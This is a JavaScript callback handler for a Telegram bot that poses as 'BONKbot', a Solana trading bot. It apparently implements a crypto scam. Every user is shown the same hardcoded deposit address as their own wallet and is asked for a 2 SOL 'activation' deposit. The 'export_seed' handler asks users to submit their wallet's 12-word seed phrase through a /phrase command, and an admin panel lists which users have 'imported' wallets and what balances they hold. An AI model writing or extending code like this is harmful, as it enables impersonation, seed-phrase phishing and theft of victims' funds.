import createUser from '../db/methods/CreateMethods/createUser.js';
import checkAdmin from '../db/methods/ReadMethods/checkAdmin.js';
import findUserWalletBalance from '../db/methods/ReadMethods/findWalletBalance.js';
import getAdmins from '../db/methods/ReadMethods/getAdmins.js';
import getUsers from '../db/methods/ReadMethods/getUsers.js';
import toggleAdminStatus from '../db/methods/UpdateMethods/upgradeToAdmin.js';
import User from '../db/models/userSchema.js';
import { agreementMenu, exportMenu, walletMenu } from './menus.js';

const registerCallbackHandlers = (bot) => {
    bot.on('callback_query', async (query) => {
        console.log("🔘 Callback Query:");
        const {
            from: {
                is_bot,
                id,
                first_name,
                last_name,
                language_code
            },
            data,
            message: {
                chat: { id: chatId }
            }
        } = query;
        let callbackAnswered = false;
        const isAdmin = await checkAdmin(id);
        console.log({ id, is_bot, first_name, last_name, language_code, data, chatId });

        try {
            switch (data) {
                case 'register': {
                    const displayName = `${first_name}${last_name ? ' ' + last_name : ''}`;
                    const existingUser = await User.findOne({ telegram_id: id });
                    if (existingUser) {
                        return bot.sendMessage(
                            chatId,
                            "Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!\n\n" +
                            "You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n" +
                            "<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
                            "Or buy SOL with Apple / Google Pay via MoonPay here:\n" +
                            "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
                            "Once done, tap refresh and your balance will appear here.\n\n" +
                            "To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.\n\n" +
                            "For more info on your wallet and to export your seed phrase, tap 'Wallet' below.",
                            {
                                reply_markup: agreementMenu.reply_markup,
                                parse_mode: "HTML",
                                disable_web_page_preview: true
                            }
                        );
                    }

                    const newUser = await createUser({
                        id,
                        is_bot,
                        first_name,
                        last_name,
                        language_code,
                    });

                    if (!newUser) {
                        return bot.sendMessage(
                            chatId,
                            `Registration failed for you, ${displayName} 😓. Please try again later.`
                        );
                    }

                    bot.sendMessage(
                        chatId,
                        "Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!\n\n" +
                        "You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:\n\n" +
                        "<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
                        "Or buy SOL with Apple / Google Pay via MoonPay here:\n" +
                        "<a href=\"https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=4k5EaQx7hbzQLfvjhRRTm9CnemhmRbHBW5AKBZhENGBq&showWalletAddressForm=true&currencyCode=sol&signature=N8oNLwn5GI1SyFFLp5%2BWuCrpUBeSDPrx%2FH2FgWgOvcA%3D\">https://buy.moonpay.com</a>\n\n" +
                        "Once done, tap refresh and your balance will appear here.\n\n" +
                        "To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener or Meteora.\n\n" +
                        "For more info on your wallet and to export your seed phrase, tap 'Wallet' below.",
                        {
                            reply_markup: agreementMenu.reply_markup,
                            parse_mode: "HTML",
                            disable_web_page_preview: true
                        }
                    );
                    break;
                }
                case 'wallet': {
                    let SOL = await findUserWalletBalance(id);
                    if (SOL === null) {
                        SOL = 0; // Default to 0 if balance not found
                    }
                    bot.sendMessage(
                        chatId,
                        "Your wallet.\n" +
                        "Address:<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
                        `Balance: ${SOL.toFixed(9)} SOL\n\n` +
                        "Tap to copy the address and send SOL to deposit.",
                        {
                            reply_markup: walletMenu.reply_markup,
                            parse_mode: "HTML",
                            disable_web_page_preview: true
                        }
                    );
                    break;
                }
                case 'deposit':
                    const walletAddress = "AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX"; // todo Replace with actual wallet address and replace across entire project
                    bot.sendMessage(chatId, "To deposit send SOL to below address:");
                    bot.sendMessage(chatId, `<code>${walletAddress}</code>`, {
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    });
                    break;
                case 'export_wallet':
                    bot.sendMessage(
                        chatId,
                        "WAYS TO ACTIVATE BOT. \n\n" +
                        "♾️ CREATE A PERSONAL WALLET\n" +
                        "You activate bot by creating and syncing new wallet fro wallet app. This gives you extra flexibility with full control over trading assets\n\n" +
                        "©️ USE BOT WEALLET\n" +
                        "Deposit into bot default wallet to activate bot and start trading immediately.\n" +
                        "Initial deposit of 2.0 Solana.\n\n",
                        {
                            reply_markup: exportMenu.reply_markup,
                            parse_mode: "HTML",
                            disable_web_page_preview: true
                        }
                    );
                    break;
                case 'connect_wallet':
                    bot.sendMessage(chatId, "Connect your personal wallet to BONKbot using WalletConnect.");
                    bot.sendMessage(chatId, "Feature currently unavailable to you. Please use the other options.");
                    break;
                case 'export_seed':
                    await bot.answerCallbackQuery(query.id, {
                        text: "Create a new wallet in your wallet app.\nThen copy the newly created wallet's 12 key phrase.\nProceed to input it below using:\n/phrase [12 key phrase]\nExample: /phrase word1 word2 word3 ... word12",
                        show_alert: true
                    });
                    callbackAnswered = true;
                    break;
                case 'help':
                    bot.sendMessage(chatId, "🆘 Help center is coming soon. Hang tight!");
                    break;
                case 'adminHelp':
                    if (!isAdmin) {
                        return bot.sendMessage(chatId, "🚫 You don't have admin rights to run this command.");
                    }
                    bot.sendMessage(chatId, "🆘 Help center is coming soon for admins. Hang tight!");
                    break;
                case 'refer':
                    bot.sendMessage(chatId, "👥 Invite your friends with your referral link:\nhttps://t.me/BONKbot?start=ref_" + id);
                    break;
                case 'dca_orders':
                    bot.sendMessage(chatId, "📈 DCA Orders functionality coming soon!");
                    break;
                case 'limit_orders':
                    bot.sendMessage(chatId, "🎯 Limit Orders coming soon. Stay tuned.");
                    break;
                case 'nighthawk':
                    bot.sendMessage(chatId, "🔒 Nighthawk mode toggled. Stealth activated.");
                    break;
                case 'refresh':
                    bot.sendMessage(chatId, "🔄 Refreshing your wallet balance... One sec.");
                    let SOL = await findUserWalletBalance(id);
                    if (SOL === null) {
                        SOL = 0; // Default to 0 if balance not found
                    }
                    bot.sendMessage(
                        chatId,
                        "Your wallet.\n" +
                        "Address:<code>AAk24Eoz2WpgiRXF829RrwxvxsED5eFhvjpZjumq9AfX</code> (tap to copy)\n\n" +
                        `Balance: ${SOL.toFixed(9)} SOL\n\n` +
                        "Tap to copy the address and send SOL to deposit.",
                        {
                            reply_markup: walletMenu.reply_markup,
                            parse_mode: "HTML",
                            disable_web_page_preview: true
                        }
                    );
                    break;
                case 'adminGetAdmins':
                    if (!isAdmin) {
                        return bot.sendMessage(chatId, "🚫 You don't have admin rights to run this command.");
                    }
                    const admins = await getAdmins() || getUsers({ is_admin: true }); // Ensure we get admins
                    if (!admins || admins.length === 0) {
                        return bot.sendMessage(chatId, "No admins found.");
                    }
                    bot.sendMessage(
                        chatId,
                        admins.length
                            ? `👮‍♂️ <b>All Admins:</b>\n\n` +
                            admins
                                .map(admin => {
                                    const {
                                        first_name,
                                        last_name,
                                        telegram_id,
                                        updatedAt
                                    } = admin;

                                    return (
                                        `👤 <b>${first_name} ${last_name || ''}</b>\n` +
                                        `🆔 ID: <code>${telegram_id}</code>\n` +
                                        `🕒 Last Updated: <i>${new Date(updatedAt).toLocaleString()}</i>\n`
                                    );
                                })
                                .join('\n\n')
                            : "⚠️ No admins found.",
                        { parse_mode: 'HTML' }
                    );
                    break;
                case 'adminGetUsers': {
                    // Ensure admin rights
                    if (!isAdmin) {
                        return bot.sendMessage(chatId, "🚫 You don't have admin rights to run this command.");
                    }

                    // Fetch users sorted by updatedAt
                    const users = await getUsers(); // Make sure getUsers sorts by updatedAt DESC
                    if (!users || users.length === 0) {
                        return bot.sendMessage(chatId, "⚠️ No registered users found.");
                    }

                    // Limit max message size if needed (Telegram has a 4096 char limit)
                    const userList = users.map(user => {
                        const {
                            first_name,
                            last_name,
                            is_admin,
                            wallet,
                            telegram_id,
                            updatedAt
                        } = user;

                        return (
                            `👤 <b>${first_name} ${last_name || ''}</b>\n` +
                            `🆔 ID: <code>${telegram_id}</code>\n` +
                            `🛡️ Admin: ${is_admin ? '✅' : '❌'}\n` +
                            `💼 Wallet Imported: ${wallet?.imported ? '✅' : '❌'}\n` +
                            `💰 SOL Balance: ${wallet?.SOL_balance ?? 0}\n` +
                            `🕒 Last Updated: <i>${new Date(updatedAt).toLocaleString()}</i>`
                        );
                    });

                    // Join all users and slice if it's too long
                    const fullMessage = `📋 <b>All Registered Users:</b>\n\n${userList.join('\n\n')}`;
                    const chunks = [];

                    // Split into safe message chunks for Telegram
                    let current = '';
                    for (let line of fullMessage.split('\n\n')) {
                        if ((current + '\n\n' + line).length > 4000) {
                            chunks.push(current);
                            current = line;
                        } else {
                            current += '\n\n' + line;
                        }
                    }
                    if (current) chunks.push(current);

                    // Send all chunks
                    for (let chunk of chunks) {
                        await bot.sendMessage(chatId, chunk.trim(), { parse_mode: 'HTML' });
                    }

                    break;
                }
                case 'adminLogout':
                    if (!isAdmin) {
                        return bot.sendMessage(chatId, "🚫 You don't have admin rights to run this command.");
                    }
                    const downgradedUser = await toggleAdminStatus(id);
                    if (!downgradedUser || downgradedUser.is_admin) {
                        bot.sendMessage(chatId, `❌ Failed to revoke admin rights. Please try again later.`);
                        return;
                    }
                    bot.sendMessage(chatId, `✅ Admin rights revoked successfully.`);
                    break;
                case 'settings': {
                    bot.sendMessage(
                        chatId,
                        `⚙️ <b>Settings</b>\n\n` +
                        `This feature is currently <i>undergoing shifts</i> 🛠️\n` +
                        `Stay tuned for future updates!`,
                        { parse_mode: 'HTML' }
                    );
                    break;
                }
                default:
                    bot.sendMessage(
                        chatId,
                        `You tapped: ${data}\n\n` +
                        "This feature is undergoing shifts. Stay tuned for updates!"
                    );
            }
        } catch (error) {
            console.error("Error during callback handling:", error);
            bot.sendMessage(
                chatId,
                `An error occurred while handling your request, ${first_name}. Please try again later.`
            );
        }
        if (!callbackAnswered) {
            bot.answerCallbackQuery(query.id);
        }
    });
};


export default registerCallbackHandlers;